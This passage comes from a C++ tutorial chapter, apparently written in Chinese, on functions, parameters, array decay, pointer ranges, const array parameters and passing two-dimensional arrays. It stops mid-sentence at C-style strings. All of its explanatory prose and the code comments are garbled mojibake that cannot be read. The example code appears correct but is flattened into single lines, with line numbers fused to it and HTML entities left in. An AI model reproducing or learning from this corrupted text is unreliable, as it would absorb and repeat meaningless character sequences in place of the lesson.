20ã€‚ä½†è¿™ä»…ä»…ä¿®æ”¹äº† n è¿™ä¸ªå±€éƒ¨å‰¯æœ¬ã€‚ å½“å‡½æ•°æ‰§è¡Œå®Œæ¯•è¿”å› main åï¼Œmain å‡½æ•°ä¸­çš„åŸå§‹å˜é‡ value ä»ç„¶æ˜¯ 10ï¼Œæ²¡æœ‰å—åˆ°å‡½æ•°å†…éƒ¨ä¿®æ”¹çš„å½±å“ã€‚ ä¼˜ç‚¹: å®‰å…¨æ€§: ä¿æŠ¤äº†åŸå§‹æ•°æ®ä¸è¢«å‡½æ•°æ„å¤–ä¿®æ”¹ã€‚ ç¼ºç‚¹: æ•ˆç‡: å¯¹äºå¤§å‹æ•°æ®ç»“æ„ï¼ˆå¦‚å¤æ‚çš„ç±»å¯¹è±¡æˆ–ç»“æ„ä½“ï¼‰ï¼Œå¤åˆ¶æ•´ä¸ªå¯¹è±¡å¯èƒ½æ¶ˆè€—è¾ƒå¤šçš„æ—¶é—´å’Œå†…å­˜ã€‚åœ¨è¿™ç§æƒ…å†µä¸‹ï¼Œåç»­ç« èŠ‚å°†ä»‹ç»çš„æŒ‰å¼•ç”¨ä¼ é€’æˆ–æŒ‰æŒ‡é’ˆä¼ é€’å¯èƒ½æ›´é«˜æ•ˆã€‚ 7.2.1 å¤šä¸ªå‚æ•°å‡½æ•°å¯ä»¥æ¥å—ä»»æ„æ•°é‡çš„å‚æ•°ã€‚åœ¨å‡½æ•°å®šä¹‰å’ŒåŸå‹ä¸­ï¼Œå‚æ•°ä¹‹é—´ç”¨é€—å· , åˆ†éš”ã€‚è°ƒç”¨å‡½æ•°æ—¶ï¼Œæä¾›çš„å®å‚ä¹Ÿå¿…é¡»ç”¨é€—å·åˆ†éš”ï¼Œå¹¶ä¸”æ•°é‡ã€ç±»å‹å’Œé¡ºåºåº”ä¸å½¢å‚åˆ—è¡¨åŒ¹é…ã€‚ ç¤ºä¾‹ï¼šæ¥å—å¤šä¸ªå‚æ•°çš„å‡½æ•° 12345678910111213141516171819#include &lt;iostream&gt;// å‡½æ•°åŸå‹ï¼šæ¥å—ä¸¤ä¸ª double å’Œä¸€ä¸ª charvoid display_data(double length, double width, char unit) &#123; std::cout &lt;&lt; &quot;Length: &quot; &lt;&lt; length &lt;&lt; &quot; &quot; &lt;&lt; unit &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Width: &quot; &lt;&lt; width &lt;&lt; &quot; &quot; &lt;&lt; unit &lt;&lt; std::endl; std::cout &lt;&lt; &quot;Area: &quot; &lt;&lt; length * width &lt;&lt; &quot; sq &quot; &lt;&lt; unit &lt;&lt; std::endl;&#125;int main() &#123; double len = 5.5; double wid = 2.0; char symbol = &#x27;m&#x27;; // è°ƒç”¨å‡½æ•°ï¼Œä¼ é€’ä¸‰ä¸ªå®å‚ display_data(len, wid, symbol); return 0;&#125; è¾“å‡º: 123Length: 5.5 mWidth: 2 mArea: 11 sq m 7.2.2 å¦å¤–ä¸€ä¸ªæ¥å—ä¸¤ä¸ªå‚æ•°çš„å‡½æ•°ä¸‹é¢æ˜¯å¦ä¸€ä¸ªç®€å•çš„ä¾‹å­ï¼Œè®¡ç®—å¹¶è¿”å›ä¸¤ä¸ªæ•´æ•°ä¸­çš„è¾ƒå¤§å€¼ã€‚ 123456789101112131415161718192021222324252627#include &lt;iostream&gt;// å‡½æ•°å®šä¹‰ï¼šæ¥å—ä¸¤ä¸ª int å‚æ•°ï¼Œè¿”å›è¾ƒå¤§çš„é‚£ä¸ª intint max(int a, int b) &#123; if (a &gt; b) &#123; return a; &#125; else &#123; return b; &#125; // æˆ–è€…ä½¿ç”¨ä¸‰å…ƒè¿ç®—ç¬¦: return (a &gt; b) ? a : b;&#125;int main() &#123; int num1 = 15; int num2 = 28; // è°ƒç”¨å‡½æ•°ï¼Œä¼ é€’ä¸¤ä¸ªå®å‚ int larger_value = max(num1, num2); std::cout &lt;&lt; &quot;Between &quot; &lt;&lt; num1 &lt;&lt; &quot; and &quot; &lt;&lt; num2 &lt;&lt; &quot;, the larger value is: &quot; &lt;&lt; larger_value &lt;&lt; std::endl; // è¾“å‡º: 28 // ä¹Ÿå¯ä»¥ç›´æ¥åœ¨è¾“å‡ºè¯­å¥ä¸­è°ƒç”¨ std::cout &lt;&lt; &quot;The max of 100 and 99 is: &quot; &lt;&lt; max(100, 99) &lt;&lt; std::endl; // è¾“å‡º: 100 return 0;&#125; è¿™ä¸ªä¾‹å­å†æ¬¡å±•ç¤ºäº†å¦‚ä½•å®šä¹‰å’Œè°ƒç”¨å¸¦æœ‰å¤šä¸ªå‚æ•°çš„å‡½æ•°ï¼Œå¹¶ä¸”è¯¥å‡½æ•°è¿˜è¿”å›ä¸€ä¸ªå€¼ã€‚å‚æ•° a å’Œ b ä¹Ÿæ˜¯æŒ‰å€¼ä¼ é€’çš„ã€‚ 7.3 å‡½æ•°å’Œæ•°ç»„å°†æ•°ç»„ä¼ é€’ç»™å‡½æ•°æ˜¯ C++ ä¸­å¸¸è§çš„æ“ä½œï¼Œä½†å…¶å·¥ä½œæ–¹å¼ä¸ä¼ é€’æ™®é€šå˜é‡ï¼ˆå¦‚ int æˆ– doubleï¼‰æœ‰æ˜¾è‘—ä¸åŒã€‚ç†è§£è¿™ç§å·®å¼‚å¯¹äºæ­£ç¡®ä½¿ç”¨æ•°ç»„ä½œä¸ºå‡½æ•°å‚æ•°è‡³å…³é‡è¦ã€‚ ä¸åŸºæœ¬ç±»å‹é»˜è®¤ä½¿ç”¨â€œæŒ‰å€¼ä¼ é€’â€ï¼ˆåˆ›å»ºå‰¯æœ¬ï¼‰ä¸åŒï¼Œå½“å°†æ•°ç»„ä¼ é€’ç»™å‡½æ•°æ—¶ï¼ŒC++ ä¸ä¼šå¤åˆ¶æ•´ä¸ªæ•°ç»„ã€‚ç›¸åï¼Œå®ƒä¼ é€’çš„æ˜¯æ•°ç»„ç¬¬ä¸€ä¸ªå…ƒç´ çš„å†…å­˜åœ°å€ã€‚è¿™æ„å‘³ç€å‡½æ•°å®é™…ä¸Šæ¥æ”¶çš„æ˜¯ä¸€ä¸ªæŒ‡å‘æ•°ç»„èµ·å§‹ä½ç½®çš„æŒ‡é’ˆã€‚ 7.3.1 å‡½æ•°å¦‚ä½•ä½¿ç”¨æŒ‡é’ˆæ¥å¤„ç†æ•°ç»„å› ä¸ºå‡½æ•°æ¥æ”¶çš„æ˜¯æ•°ç»„çš„åœ°å€ï¼ˆæŒ‡é’ˆï¼‰ï¼Œæ‰€ä»¥å®ƒå¯ä»¥é€šè¿‡è¿™ä¸ªåœ°å€ç›´æ¥è®¿é—®å’Œä¿®æ”¹åŸå§‹æ•°ç»„çš„å†…å®¹ã€‚è¿™ä¸æŒ‰å€¼ä¼ é€’å®Œå…¨ä¸åŒï¼Œåè€…æ“ä½œçš„æ˜¯å‰¯æœ¬ã€‚ åœ¨å‡½æ•°å®šä¹‰ä¸­ï¼Œæ¥æ”¶æ•°ç»„å‚æ•°æœ‰å‡ ç§ç­‰æ•ˆçš„è¯­æ³•ï¼š 12345678// è¯­æ³• 1: ä½¿ç”¨æŒ‡é’ˆè¡¨ç¤ºæ³•void process_array(int* arr, int size);// è¯­æ³• 2: ä½¿ç”¨å¸¦ç©ºæ‹¬å·çš„æ•°ç»„è¡¨ç¤ºæ³•void process_array(int arr[], int size);// è¯­æ³• 3: ä½¿ç”¨å¸¦æŒ‡å®šå¤§å°çš„æ•°ç»„è¡¨ç¤ºæ³• (å¤§å°ä¼šè¢«å¿½ç•¥ï¼Œä¸æ¨è)// void process_array(int arr[10], int size); // è¿™é‡Œçš„ 10 å®é™…ä¸Šæ²¡æœ‰ä½œç”¨ è¿™ä¸‰ç§è¯­æ³•åœ¨å‡½æ•°å‚æ•°åˆ—è¡¨ä¸­æ˜¯ç­‰æ•ˆçš„ï¼Œå®ƒä»¬éƒ½å‘Šè¯‰ç¼–è¯‘å™¨ arr æ˜¯ä¸€ä¸ªæŒ‡å‘ int çš„æŒ‡é’ˆã€‚æœ€å¸¸ç”¨çš„æ˜¯è¯­æ³• 1 å’Œè¯­æ³• 2ã€‚ å…³é”®ç‚¹: æ— è®ºä½¿ç”¨å“ªç§è¯­æ³•ï¼Œå‡½æ•°éƒ½ä¸çŸ¥é“æ•°ç»„çš„å®é™…å¤§å°ã€‚å› æ­¤ï¼Œé€šå¸¸éœ€è¦å°†æ•°ç»„çš„å¤§å°ä½œä¸ºå•ç‹¬çš„å‚æ•°ä¼ é€’ç»™å‡½æ•°ã€‚ ç¤ºä¾‹ï¼šå‡½æ•°ä¿®æ”¹æ•°ç»„å…ƒç´  12345678910111213141516171819202122232425262728293031#include &lt;iostream&gt;// å‡½æ•°åŸå‹ï¼šæ¥æ”¶ä¸€ä¸ª int æŒ‡é’ˆ (æ•°ç»„) å’Œå¤§å°void double_elements(int arr[], int size) &#123; // æˆ–è€… int* arr std::cout &lt;&lt; &quot;Inside function: Modifying array elements...&quot; &lt;&lt; std::endl; for (int i = 0; i &lt; size; ++i) &#123; arr[i] *= 2; // ç›´æ¥ä¿®æ”¹åŸå§‹æ•°ç»„çš„å…ƒç´  &#125;&#125;int main() &#123; int my_array[] = &#123;1, 2, 3, 4, 5&#125;; int array_size = sizeof(my_array) / sizeof(my_array[0]); // è®¡ç®—æ•°ç»„å¤§å° std::cout &lt;&lt; &quot;Before calling function: &quot;; for (int i = 0; i &lt; array_size; ++i) &#123; std::cout &lt;&lt; my_array[i] &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl; // è°ƒç”¨å‡½æ•°ï¼Œä¼ é€’æ•°ç»„å (å³åœ°å€) å’Œå¤§å° double_elements(my_array, array_size); std::cout &lt;&lt; &quot;After calling function: &quot;; for (int i = 0; i &lt; array_size; ++i) &#123; std::cout &lt;&lt; my_array[i] &lt;&lt; &quot; &quot;; // æ•°ç»„å†…å®¹å·²è¢«ä¿®æ”¹ &#125; std::cout &lt;&lt; std::endl; return 0;&#125; è¾“å‡º: 123Before calling function: 1 2 3 4 5Inside function: Modifying array elements...After calling function: 2 4 6 8 10 ä»£ç è§£é‡Š: main å‡½æ•°å®šä¹‰äº†ä¸€ä¸ªæ•°ç»„ my_arrayã€‚ è°ƒç”¨ double_elements(my_array, array_size) æ—¶ï¼Œmy_array (ä»£è¡¨æ•°ç»„é¦–å…ƒç´ çš„åœ°å€) è¢«ä¼ é€’ç»™å‡½æ•°çš„ arr å‚æ•°ï¼Œarray_size è¢«ä¼ é€’ç»™ size å‚æ•°ã€‚ å‡½æ•°å†…éƒ¨é€šè¿‡æŒ‡é’ˆ arr è®¿é—®å¹¶ä¿®æ”¹äº† main å‡½æ•°ä¸­å®šä¹‰çš„ my_array çš„å…ƒç´ ã€‚ å‡½æ•°è¿”å›åï¼Œmain å‡½æ•°ä¸­çš„ my_array çš„å†…å®¹ç¡®å®å‘ç”Ÿäº†æ”¹å˜ã€‚ 7.3.2 å°†æ•°ç»„ä½œä¸ºå‚æ•°æ„å‘³ç€ä»€ä¹ˆå°†æ•°ç»„åä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œä¼šå‘ç”Ÿæ‰€è°“çš„â€œæ•°ç»„é€€åŒ–â€ï¼ˆArray Decayï¼‰ã€‚æ•°ç»„åä¼šâ€œé€€åŒ–â€æˆæŒ‡å‘å…¶ç¬¬ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆã€‚è¿™å°±æ˜¯ä¸ºä»€ä¹ˆå‡½æ•°å‚æ•° int arr[] å’Œ int* arr æ˜¯ç­‰ä»·çš„ã€‚ Implications: æ•ˆç‡: ä¸éœ€è¦å¤åˆ¶æ•´ä¸ªæ•°ç»„ï¼Œä¼ é€’åœ°å€éå¸¸å¿«ï¼Œå°¤å…¶æ˜¯å¯¹äºå¤§æ•°ç»„ã€‚ ä¿®æ”¹èƒ½åŠ›: å‡½æ•°å¯ä»¥ç›´æ¥ä¿®æ”¹è°ƒç”¨è€…æä¾›çš„åŸå§‹æ•°ç»„ã€‚è¿™æ—¢æ˜¯ä¼˜ç‚¹ï¼ˆå…è®¸å‡½æ•°â€œè¿”å›â€ä¿®æ”¹åçš„æ•°ç»„ï¼‰ä¹Ÿæ˜¯ç¼ºç‚¹ï¼ˆå¯èƒ½æ„å¤–ä¿®æ”¹æ•°æ®ï¼‰ã€‚ ä¸¢å¤±å¤§å°ä¿¡æ¯: å‡½æ•°æœ¬èº«æ— æ³•çŸ¥é“æ•°ç»„çš„å¤§å°ã€‚å¿…é¡»æ˜¾å¼ä¼ é€’å¤§å°ä¿¡æ¯ã€‚ 7.3.3 æ›´å¤šæ•°ç»„å‡½æ•°ç¤ºä¾‹ç¤ºä¾‹ 1: è®¡ç®—æ•°ç»„å…ƒç´ æ€»å’Œ 123456789101112131415161718#include &lt;iostream&gt;// å‡½æ•°ï¼šè®¡ç®—æ•°ç»„å…ƒç´ çš„æ€»å’Œint sum_array(const int arr[], int size) &#123; // ä½¿ç”¨ const é˜²æ­¢æ„å¤–ä¿®æ”¹ int total = 0; for (int i = 0; i &lt; size; ++i) &#123; total += arr[i]; &#125; return total;&#125;int main() &#123; int data[] = &#123;10, 20, 30, 40&#125;; int size = sizeof(data) / sizeof(data[0]); int sum = sum_array(data, size); std::cout &lt;&lt; &quot;Sum of array elements: &quot; &lt;&lt; sum &lt;&lt; std::endl; // è¾“å‡º: 100 return 0;&#125; ç¤ºä¾‹ 2: æŸ¥æ‰¾æ•°ç»„ä¸­çš„æœ€å¤§å€¼ 12345678910111213141516171819202122232425#include &lt;iostream&gt;#include &lt;limits&gt; // ä¸ºäº†ä½¿ç”¨ INT_MIN// å‡½æ•°ï¼šæŸ¥æ‰¾æ•°ç»„ä¸­çš„æœ€å¤§å€¼int find_max(const int* arr, int size) &#123; // ä½¿ç”¨æŒ‡é’ˆè¡¨ç¤ºæ³•å’Œ const if (size &lt;= 0) &#123; std::cerr &lt;&lt; &quot;Error: Array size must be positive.&quot; &lt;&lt; std::endl; return std::numeric_limits&lt;int&gt;::min(); // è¿”å›å¯èƒ½çš„æœ€å°å€¼ä½œä¸ºé”™è¯¯æŒ‡ç¤º &#125; int max_val = arr[0]; for (int i = 1; i &lt; size; ++i) &#123; if (arr[i] &gt; max_val) &#123; max_val = arr[i]; &#125; &#125; return max_val;&#125;int main() &#123; int scores[] = &#123;88, 95, 72, 100, 91&#125;; int count = sizeof(scores) / sizeof(scores[0]); int highest_score = find_max(scores, count); std::cout &lt;&lt; &quot;Highest score: &quot; &lt;&lt; highest_score &lt;&lt; std::endl; // è¾“å‡º: 100 return 0;&#125; 7.3.4 ä½¿ç”¨æ•°ç»„åŒºé—´çš„å‡½æ•°é™¤äº†ä¼ é€’æ•°ç»„é¦–åœ°å€å’Œå¤§å°ä¹‹å¤–ï¼Œå¦ä¸€ç§å¸¸è§ä¸”æ›´çµæ´»çš„æ–¹æ³•æ˜¯ä¼ é€’æŒ‡å‘æ•°ç»„å¼€å§‹å’Œç»“æŸä¹‹åä½ç½®çš„æŒ‡é’ˆï¼ˆæˆ–è¿­ä»£å™¨ï¼ŒSTL ä¸­å¸¸ç”¨ï¼‰ã€‚è¿™å®šä¹‰äº†ä¸€ä¸ªå¤„ç†èŒƒå›´ [begin, end)ï¼ˆåŒ…å« beginï¼Œä¸åŒ…å« endï¼‰ã€‚ ç¤ºä¾‹ï¼šä½¿ç”¨æŒ‡é’ˆåŒºé—´æ±‚å’Œ 1234567891011121314151617181920212223242526#include &lt;iostream&gt;// å‡½æ•°ï¼šè®¡ç®—ä» begin åˆ° end (ä¸å« end) çš„å…ƒç´ å’Œint sum_range(const int* begin, const int* end) &#123; int total = 0; // å¾ªç¯ç›´åˆ°å½“å‰æŒ‡é’ˆè¾¾åˆ° end æŒ‡é’ˆ for (const int* ptr = begin; ptr != end; ++ptr) &#123; total += *ptr; // è§£å¼•ç”¨æŒ‡é’ˆè·å–å…ƒç´ å€¼ &#125; return total;&#125;int main() &#123; int data[] = &#123;1, 2, 3, 4, 5, 6, 7, 8, 9, 10&#125;; int size = sizeof(data) / sizeof(data[0]); // è®¡ç®—æ•´ä¸ªæ•°ç»„çš„å’Œ int total_sum = sum_range(data, data + size); // data + size æŒ‡å‘æ•°ç»„æœ«å°¾ä¹‹åçš„ä½ç½® std::cout &lt;&lt; &quot;Total sum: &quot; &lt;&lt; total_sum &lt;&lt; std::endl; // è¾“å‡º: 55 // è®¡ç®—æ•°ç»„ä¸€éƒ¨åˆ†çš„å’Œ (ä¾‹å¦‚ï¼Œç´¢å¼• 2 åˆ° 6ï¼Œå³å…ƒç´  3, 4, 5, 6, 7) int partial_sum = sum_range(data + 2, data + 7); // data+2 æŒ‡å‘ç¬¬3ä¸ªå…ƒç´ , data+7 æŒ‡å‘ç¬¬8ä¸ªå…ƒç´  (åŒºé—´ç»ˆç‚¹) std::cout &lt;&lt; &quot;Partial sum (index 2 to 6): &quot; &lt;&lt; partial_sum &lt;&lt; std::endl; // è¾“å‡º: 25 return 0;&#125; è¿™ç§æ–¹æ³•åœ¨ C++ æ ‡å‡†åº“ç®—æ³•ä¸­éå¸¸å¸¸ç”¨ã€‚ 7.3.5 æŒ‡é’ˆå’Œ constå¦‚å‰é¢çš„ç¤ºä¾‹æ‰€ç¤ºï¼Œå¦‚æœå‡½æ•°ä¸åº”è¯¥ä¿®æ”¹ä¼ å…¥çš„æ•°ç»„ï¼Œåº”è¯¥åœ¨å‡½æ•°å‚æ•°ä¸­ä½¿ç”¨ const å…³é”®å­—ã€‚è¿™æ˜¯ä¸€ç§é‡è¦çš„ç¼–ç¨‹å®è·µï¼Œå¯ä»¥æé«˜ä»£ç çš„å®‰å…¨æ€§å’Œæ¸…æ™°åº¦ã€‚ 123456789// è¿™ä¸ªå‡½æ•°æ‰¿è¯ºä¸ä¼šä¿®æ”¹ arr æŒ‡å‘çš„æ•°ç»„å†…å®¹void print_array(const int arr[], int size) &#123; std::cout &lt;&lt; &quot;Array elements: &quot;; for (int i = 0; i &lt; size; ++i) &#123; // arr[i] = 0; // é”™è¯¯ï¼ç¼–è¯‘å™¨ä¼šé˜»æ­¢ä¿®æ”¹ const æ•°æ® std::cout &lt;&lt; arr[i] &lt;&lt; &quot; &quot;; &#125; std::cout &lt;&lt; std::endl;&#125; ä½¿ç”¨ const æœ‰ä¸¤ä¸ªä¸»è¦å¥½å¤„ï¼š é˜²æ­¢æ„å¤–ä¿®æ”¹: ç¼–è¯‘å™¨ä¼šæ£€æŸ¥å¹¶é˜»æ­¢å‡½æ•°å†…éƒ¨å¯¹ const å‚æ•°çš„ä¿®æ”¹å°è¯•ã€‚ è¡¨æ˜æ„å›¾: å‘å‡½æ•°çš„è°ƒç”¨è€…è¡¨æ˜è¯¥å‡½æ•°ä¸ä¼šæ”¹å˜ä¼ å…¥çš„æ•°ç»„ï¼Œä½¿å¾—å‡½æ•°æ¥å£æ›´æ¸…æ™°ã€‚ æ¥å—æ›´å¹¿æ³›çš„å‚æ•°: const å‚æ•°çš„å‡½æ•°å¯ä»¥æ¥å— const æ•°ç»„å’Œé const æ•°ç»„ä½œä¸ºå®å‚ï¼Œè€Œé const å‚æ•°çš„å‡½æ•°åªèƒ½æ¥å—é const æ•°ç»„ã€‚ æ€»ç»“æ¥è¯´ï¼Œå°†æ•°ç»„ä¼ é€’ç»™å‡½æ•°æ˜¯é€šè¿‡ä¼ é€’æŒ‡å‘å…¶é¦–å…ƒç´ çš„æŒ‡é’ˆæ¥å®ç°çš„ã€‚è¿™ä½¿å¾—å‡½æ•°èƒ½å¤Ÿè®¿é—®å’Œï¼ˆå¦‚æœæœªä½¿ç”¨ constï¼‰ä¿®æ”¹åŸå§‹æ•°ç»„ï¼Œä½†ä¹Ÿè¦æ±‚è°ƒç”¨è€…é€šå¸¸éœ€è¦é¢å¤–ä¼ é€’æ•°ç»„çš„å¤§å°æˆ–ä½¿ç”¨æŒ‡é’ˆåŒºé—´æ¥ç•Œå®šæ“ä½œèŒƒå›´ã€‚ 7.4 å‡½æ•°å’ŒäºŒç»´æ•°ç»„å°†äºŒç»´æ•°ç»„ä¼ é€’ç»™å‡½æ•°æ¯”ä¼ é€’ä¸€ç»´æ•°ç»„ç¨å¾®å¤æ‚ä¸€äº›ã€‚ä¸ä¸€ç»´æ•°ç»„ç±»ä¼¼ï¼ŒäºŒç»´æ•°ç»„ååœ¨ä¼ é€’æ—¶ä¹Ÿä¼šâ€œé€€åŒ–â€æˆæŒ‡å‘å…¶ç¬¬ä¸€ä¸ªå…ƒç´ çš„æŒ‡é’ˆã€‚ä½†äºŒç»´æ•°ç»„çš„ç¬¬ä¸€ä¸ªå…ƒç´ æœ¬èº«æ˜¯ä¸€ä¸ªä¸€ç»´æ•°ç»„ã€‚å› æ­¤ï¼Œä¼ é€’çš„æ˜¯æŒ‡å‘ä¸€ç»´æ•°ç»„çš„æŒ‡é’ˆã€‚ ä¸ºäº†è®©å‡½æ•°èƒ½å¤Ÿæ­£ç¡®åœ°è®¡ç®—å…ƒç´ åœ¨å†…å­˜ä¸­çš„ä½ç½®ï¼Œç¼–è¯‘å™¨éœ€è¦çŸ¥é“é™¤ç¬¬ä¸€ç»´ï¼ˆè¡Œæ•°ï¼‰ä¹‹å¤–çš„æ‰€æœ‰å…¶ä»–ç»´åº¦çš„å¤§å°ï¼ˆåˆ—æ•°ï¼Œä»¥åŠæ›´é«˜ç»´åº¦çš„ç›¸åº”å¤§å°ï¼‰ã€‚ å…³é”®ç‚¹: åœ¨å‡½æ•°å‚æ•°ä¸­å£°æ˜äºŒç»´æ•°ç»„æ—¶ï¼Œå¿…é¡»æŒ‡å®šé™¤ç¬¬ä¸€ç»´ä¹‹å¤–çš„æ‰€æœ‰ç»´åº¦çš„å¤§å°ã€‚ç¬¬ä¸€ç»´çš„å¤§å°æ˜¯å¯é€‰çš„ï¼ˆé€šå¸¸çœç•¥ï¼‰ã€‚ è¯­æ³•: å‡è®¾æœ‰ä¸€ä¸ªäºŒç»´æ•°ç»„ int data[3][4]; å‡½æ•°åŸå‹æˆ–å®šä¹‰å¯ä»¥è¿™æ ·å†™ï¼š 123456789// è¯­æ³• 1: æŒ‡å®šåˆ—æ•°void process_2d_array(int arr[][4], int rows); // å¿…é¡»æŒ‡å®šåˆ—æ•° 4// è¯­æ³• 2: ä½¿ç”¨æŒ‡å‘æ•°ç»„çš„æŒ‡é’ˆ (æ›´ç²¾ç¡®åœ°åæ˜ åº•å±‚æœºåˆ¶)// arr æ˜¯ä¸€ä¸ªæŒ‡é’ˆï¼ŒæŒ‡å‘ä¸€ä¸ªåŒ…å« 4 ä¸ª int çš„æ•°ç»„void process_2d_array(int (*arr)[4], int rows);// è¯­æ³• 3: å¯ä»¥åŒ…å«ç¬¬ä¸€ç»´ï¼Œä½†é€šå¸¸çœç•¥// void process_2d_array(int arr[3][4], int rows); // è¿™é‡Œçš„ 3 å®é™…ä¸Šä¼šè¢«å¿½ç•¥ ä¸ºä»€ä¹ˆå¿…é¡»æŒ‡å®šåˆ—æ•°ï¼Ÿ è€ƒè™‘äºŒç»´æ•°ç»„ arr[rows][cols] åœ¨å†…å­˜ä¸­æ˜¯çº¿æ€§å­˜å‚¨çš„ã€‚è¦è®¿é—®å…ƒç´  arr[i][j]ï¼Œç¼–è¯‘å™¨éœ€è¦è®¡ç®—å…¶å†…å­˜åœ°å€ï¼Œå…¬å¼é€šå¸¸ç±»ä¼¼äºï¼šåŸºåœ°å€ + (i * cols + j) * sizeof(å…ƒç´ ç±»å‹)ã€‚å¯ä»¥çœ‹åˆ°ï¼Œè®¡ç®—åœ°å€éœ€è¦çŸ¥é“ colsï¼ˆåˆ—æ•°ï¼‰çš„å€¼ã€‚å¦‚æœå‡½æ•°ä¸çŸ¥é“åˆ—æ•°ï¼Œå°±æ— æ³•æ­£ç¡®åœ°è¿›è¡ŒæŒ‡é’ˆè¿ç®—æ¥å®šä½å…ƒç´ ã€‚ ç¤ºä¾‹ï¼šå¤„ç†äºŒç»´æ•°ç»„çš„å‡½æ•° 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748#include &lt;iostream&gt;const int COLS = 4; // ä½¿ç”¨å¸¸é‡å®šä¹‰åˆ—æ•°ï¼Œæ–¹ä¾¿ç»´æŠ¤// å‡½æ•°åŸå‹ï¼šè®¡ç®—äºŒç»´æ•°ç»„æ‰€æœ‰å…ƒç´ çš„å’Œ// å‚æ•°ï¼šäºŒç»´æ•°ç»„ (å¿…é¡»æŒ‡å®šåˆ—æ•° COLS)ï¼Œè¡Œæ•°int sum_2d_array(int arr[][COLS], int rows);// å‡½æ•°åŸå‹ï¼šæ‰“å°äºŒç»´æ•°ç»„void print_2d_array(const int arr[][COLS], int rows); // ä½¿ç”¨ const é˜²æ­¢ä¿®æ”¹int main() &#123; int data[3][COLS] = &#123; &#123;1, 2, 3, 4&#125;, &#123;5, 6, 7, 8&#125;, &#123;9, 10, 11, 12&#125; &#125;; int num_rows = 3; std::cout &lt;&lt; &quot;Original 2D Array:&quot; &lt;&lt; std::endl; print_2d_array(data, num_rows); int total_sum = sum_2d_array(data, num_rows); std::cout &lt;&lt; &quot;\\nSum of all elements: &quot; &lt;&lt; total_sum &lt;&lt; std::endl; // è¾“å‡º: 78 return 0;&#125;// å‡½æ•°å®šä¹‰ï¼šè®¡ç®—äºŒç»´æ•°ç»„æ‰€æœ‰å…ƒç´ çš„å’Œint sum_2d_array(int arr[][COLS], int rows) &#123; int sum = 0; for (int i = 0; i &lt; rows; ++i) &#123; for (int j = 0; j &lt; COLS; ++j) &#123; sum += arr[i][j]; &#125; &#125; return sum;&#125;// å‡½æ•°å®šä¹‰ï¼šæ‰“å°äºŒç»´æ•°ç»„void print_2d_array(const int arr[][COLS], int rows) &#123; for (int i = 0; i &lt; rows; ++i) &#123; for (int j = 0; j &lt; COLS; ++j) &#123; std::cout &lt;&lt; arr[i][j] &lt;&lt; &quot;\\t&quot;; // ä½¿ç”¨åˆ¶è¡¨ç¬¦åˆ†éš” &#125; std::cout &lt;&lt; std::endl; // æ¯è¡Œç»“æŸåæ¢è¡Œ &#125;&#125; ä»£ç è§£é‡Š: æˆ‘ä»¬å®šä¹‰äº†ä¸€ä¸ªå…¨å±€å¸¸é‡ COLS æ¥è¡¨ç¤ºæ•°ç»„çš„åˆ—æ•°ã€‚è¿™ä½¿å¾—åœ¨å‡½æ•°åŸå‹å’Œå®šä¹‰ä¸­æŒ‡å®šåˆ—æ•°æ›´åŠ æ–¹ä¾¿å’Œä¸€è‡´ã€‚ sum_2d_array å’Œ print_2d_array å‡½æ•°çš„ç¬¬ä¸€ä¸ªå‚æ•°éƒ½å£°æ˜ä¸º int arr[][COLS] æˆ– const int arr[][COLS]ï¼Œæ˜ç¡®æŒ‡å®šäº†åˆ—çš„å¤§å°ã€‚ main å‡½æ•°ä¸­å®šä¹‰äº†ä¸€ä¸ª 3x4 çš„äºŒç»´æ•°ç»„ dataã€‚ è°ƒç”¨å‡½æ•°æ—¶ï¼Œä¼ é€’æ•°ç»„å dataï¼ˆå®ƒä»£è¡¨æŒ‡å‘ç¬¬ä¸€ä¸ªåŒ…å« COLS ä¸ª int çš„ä¸€ç»´æ•°ç»„çš„æŒ‡é’ˆï¼‰å’Œè¡Œæ•° num_rowsã€‚ å‡½æ•°å†…éƒ¨å¯ä»¥ä½¿ç”¨æ ‡å‡†çš„ arr[i][j] è¯­æ³•æ¥è®¿é—®æ•°ç»„å…ƒç´ ï¼Œå› ä¸ºç¼–è¯‘å™¨çŸ¥é“åˆ—æ•° COLSï¼Œå¯ä»¥æ­£ç¡®è®¡ç®—æ¯ä¸ªå…ƒç´ çš„åœ°å€ã€‚ æ€»ç»“: å°†äºŒç»´ï¼ˆæˆ–æ›´é«˜ç»´ï¼‰æ•°ç»„ä¼ é€’ç»™å‡½æ•°æ—¶ï¼Œå¿…é¡»åœ¨å‡½æ•°å‚æ•°ä¸­æŒ‡å®šé™¤ç¬¬ä¸€ç»´ä¹‹å¤–çš„æ‰€æœ‰ç»´åº¦çš„å¤§å°ã€‚ è¿™æ˜¯å› ä¸ºå‡½æ•°éœ€è¦è¿™äº›ç»´åº¦ä¿¡æ¯æ¥è¿›è¡Œæ­£ç¡®çš„æŒ‡é’ˆè¿ç®—ä»¥è®¿é—®æ•°ç»„å…ƒç´ ã€‚ é€šå¸¸å°†æ•°ç»„ç»´åº¦ï¼ˆå°¤å…¶æ˜¯é™¤ç¬¬ä¸€ç»´å¤–çš„ç»´åº¦ï¼‰å®šä¹‰ä¸ºå¸¸é‡ï¼Œä»¥æé«˜ä»£ç çš„å¯è¯»æ€§å’Œå¯ç»´æŠ¤æ€§ã€‚ ä¸ä¸€ç»´æ•°ç»„ä¸€æ ·ï¼Œå‡½æ•°æ“ä½œçš„æ˜¯åŸå§‹æ•°ç»„ï¼Œè€Œä¸æ˜¯å‰¯æœ¬ï¼ˆé™¤éä½¿ç”¨äº† constï¼Œå¦åˆ™å‡½æ•°å¯ä»¥ä¿®æ”¹åŸå§‹æ•°ç»„ï¼‰ã€‚ 7.5 å‡½æ•°å’Œ C-é£æ ¼å­—ç¬¦ä¸²C-é£æ ¼å­—ç¬¦ä¸²æœ¬è´¨ä¸Šæ˜¯å­—ç¬¦æ•°ç»„ (char[])ï¼Œå…¶æœ«å°¾æœ‰ä¸€ä¸ªç‰¹æ®Šçš„ç©ºå­—ç¬¦ (\\0) æ¥æ ‡è®°å­—ç¬¦ä¸²çš„ç»“æŸã€‚å› æ­¤ï¼Œå°† C-é£æ ¼å­—ç¬¦ä¸²ä¼ é€’ç»™å‡½æ•°éµå¾ªä¸ä¼ é€’æ™®é€šæ•°ç»„ç›¸åŒçš„è§„åˆ™ï¼šä¼ 